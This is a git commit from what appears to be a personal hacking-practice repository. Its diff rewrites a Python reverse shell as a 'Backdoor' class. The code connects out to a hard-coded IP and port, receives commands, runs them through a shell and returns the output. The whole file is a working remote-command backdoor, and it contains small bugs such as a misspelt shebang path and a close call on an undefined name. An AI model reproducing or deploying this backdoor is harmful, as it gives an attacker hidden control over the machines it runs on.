590aeeaa816466d4ab6f0ba1c56d82511563c178
jakiiii <me.jaki@outlook.com>
2018-12-24 00:23:06 +0600

    create Backdoor method in cleas view

--- backdoors/reverse_backdoors.py
+++ backdoors/reverse_backdoors.py
@@ -1,20 +1,23 @@
-#!/user/bin/env python
+ #!/user/bin/env python
 import socket
 import subprocess
 
 
-def execute_system_command(command):
-	return subprocess.check_output(command, shell=True).decode()
+class Backdoor:
+	def __init__(self, ip, port):
+		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		self.connection.connect((ip, port))
+
+	def execute_system_command(self, command):
+		return subprocess.check_output(command, shell=True).decode()
+
+	def  run(self):
+		while True:
+			command = self.connection.recv(1024)
+			command_data = self.execute_system_command(command.decode("utf-8"))
+			self.connection.send(command_data.encode("utf-8"))
+		connection.close()
 
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(("192.168.146.148", 1337))
-
-data = connection.send("\n[+] connection established!\n".encode("utf-8"))
-
-while True:
-	command = connection.recv(1024)
-	command_data = execute_system_command(command.decode("utf-8"))
-	connection.send(command_data.encode("utf-8"))
-
-connection.close()
+backdoor = Backdoor("192.168.146.149", 1337)
+backdoor.run()
